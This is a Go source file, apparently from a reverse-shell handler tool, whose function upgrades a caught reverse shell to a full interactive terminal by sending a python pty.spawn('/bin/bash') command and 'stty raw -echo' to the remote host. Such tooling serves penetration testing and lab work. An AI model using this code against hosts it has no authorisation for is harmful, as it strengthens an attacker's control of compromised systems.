package pty

import (
	"fmt"
	"time"

	"github.com/Aryma-f4/necromancy/core"
)

// AutoUpgrade attempts to upgrade the dumb reverse shell to a full PTY.
// It uses python3/python by default, similar to the original Necromancy script.
func AutoUpgrade(s *core.Session) error {
	if s.Type == "PTY" {
		return fmt.Errorf("session is already PTY")
	}

	// 1. Send the Python PTY spawn command.
	// This command executes python to spawn a bash PTY and redirects stderr to stdout.
	cmd := `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'` + "\n"
	s.Write([]byte(cmd))

	// Give the remote end a moment to execute
	time.Sleep(500 * time.Millisecond)

	// 2. Set terminal variables to match our local xterm
	s.Write([]byte("export TERM=xterm-256color\n"))
	
	// 3. Mark session as PTY so the interactor knows to send SIGWINCH dimensions
	s.Type = "PTY"
	
	// 4. Send initial terminal size
	core.SendTerminalSize(s)
	
	// 5. Send 'stty raw -echo' on the REMOTE side to prevent double echoing
	// (Local side is handled by term.MakeRaw in core.Interact)
	s.Write([]byte("stty raw -echo\n"))
	
	// Clear screen to make it look clean
	s.Write([]byte("clear\n"))
	
	return nil
}
